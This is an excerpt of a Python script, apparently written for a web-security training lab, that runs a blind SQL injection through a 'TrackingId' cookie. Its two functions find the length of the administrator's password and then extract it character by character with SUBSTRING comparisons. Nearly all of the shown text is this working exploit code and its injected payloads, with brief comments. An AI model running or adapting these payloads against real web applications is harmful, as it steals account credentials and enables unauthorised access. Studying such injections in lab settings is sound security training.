...
def length_calc(url):
    ...
    while loop: #Setting loop to find the length of password
        ...
        payload = cookies_received["TrackingId"] + f"' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password)>{num})='a'--" #Checking the length of password
...
def injection(url):
    ...
    for num in range(password_length):
        for char in char_set:
            ...
            payload = cookies_received["TrackingId"] + f"' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password,{num+1},1)='{char}')='a'--" #Checking each and every alphanumeric character for every character of passowrd
